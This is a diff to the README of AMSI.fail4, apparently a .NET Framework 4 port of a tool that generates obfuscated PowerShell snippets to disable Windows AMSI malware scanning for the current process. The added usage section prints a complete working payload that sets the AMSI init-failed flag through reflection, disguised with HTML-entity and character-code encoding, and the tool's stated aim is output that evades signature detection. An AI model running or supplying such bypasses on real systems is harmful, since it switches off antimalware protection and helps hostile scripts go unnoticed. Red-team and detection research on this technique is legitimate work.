@@ -1,8 +1,21 @@
- # AMSI.fail 
-C# Azure Function with an HTTP trigger that generates obfuscated PowerShell snippets that break or disable AMSI for the current process.
+ # AMSI.fail4
+Converted AMSI.fail to a .NET Framework 4 solution so that it can be called from PowerShell 5.
+
+
+
 The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.
- 
+
 Checkout https://www.amsi.fail/ for a live and working demo!
+
+## Usage
+
+```
+PS > Add-Type -Path ".\AMSIFail4.dll"
+PS > [AMSIFail.Generator]::GetPayload()
+[Ref].Assembly.GetType('System.Management.Automation.'+$([SysTeM.Net.wEBUTiliTY]::HTmldEcOde('&#65;&#109;&#115;&#105;'))+'Utils').GetField(''+$([ChaR]([BytE]0x61)+[chAR]([ByTe]0x6D)+[CHaR](6095/53)+[ChaR]([ByTe]0x69))+'InitFailed',$([sySTeM.NeT.webUtilItY]::hTmLDECoDE('&#78;&#111;&#110;&#80;&#117;&#98;&#108;&#105;&#99;&#44;&#83;&#116;&#97;&#116;&#105;&#99;'))).SetValue($null,$true);
+```
+
+
 
 
 # What is AMSI?
